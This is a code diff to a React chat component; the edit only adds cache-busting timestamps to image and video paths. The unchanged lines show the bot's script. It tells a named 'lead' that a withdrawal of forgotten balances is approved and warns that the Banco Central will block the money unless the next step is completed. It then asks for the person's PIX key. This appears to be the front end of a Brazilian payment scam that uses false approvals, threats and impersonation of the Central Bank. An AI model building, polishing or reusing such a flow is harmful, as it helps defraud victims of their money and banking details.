@@ -305,7 +305,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
 
           setTimeout(() => {
             setTyping(false);
-            addBotMessage(`Parabéns, ${leadName}!\n\nA sua solicitação de saque foi aprovada no valor de **${leadValue}** referentes a saldos esquecidos.`, undefined, "/assets/banners/banner_saque_aprovado.png", undefined, localAudioUrl);
+            addBotMessage(`Parabéns, ${leadName}!\n\nA sua solicitação de saque foi aprovada no valor de **${leadValue}** referentes a saldos esquecidos.`, undefined, `/assets/banners/banner_saque_aprovado.png?v=${Date.now()}`, undefined, localAudioUrl);
             
             if (localAudioUrl && audioRef.current) {
                audioRef.current.src = localAudioUrl;
@@ -316,7 +316,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
               setTyping(true);
               setTimeout(() => {
                 setTyping(false);
-                addBotMessage(`Assista ao vídeo abaixo para entender como realizar o saque do seu valor disponível:`, undefined, undefined, undefined, undefined, "/assets/banners/video_explicacao.mp4");
+                addBotMessage(`Assista ao vídeo abaixo para entender como realizar o saque do seu valor disponível:`, undefined, undefined, undefined, undefined, `/assets/banners/video_explicacao.mp4?v=${Date.now()}`);
                 
                 setTimeout(() => {
                   setTyping(true);
@@ -359,7 +359,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         setTyping(false);
         addBotMessage(`**ATENÇÃO:** Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber o valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central.\n\nCaso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos.\n\n**Observação:** Isso só acontecerá se você não concluir a etapa a seguir.`, [
            { text: "Entendi, quero receber", action: "ask_pix" }
-        ], "/assets/banners/banner_atencao.png");
+        ], `/assets/banners/banner_atencao.png?v=${Date.now()}`);
       }, 1500);
     }
     else if (action === "ask_pix") {
@@ -375,9 +375,9 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         setTyping(false);
         const isCnpj = data.docType.toUpperCase() === 'CNPJ';
         if (isCnpj) {
-          addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a Chave PIX da empresa (ou a sua Chave PIX de preferência):`, undefined, "/assets/banners/banner_pix.png");
+          addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a Chave PIX da empresa (ou a sua Chave PIX de preferência):`, undefined, `/assets/banners/banner_pix.png?v=${Date.now()}`);
         } else {
-          addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, "/assets/banners/banner_pix.png");
+          addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, `/assets/banners/banner_pix.png?v=${Date.now()}`);
         }
         setAwaitingPix(true);
       }, 1500);
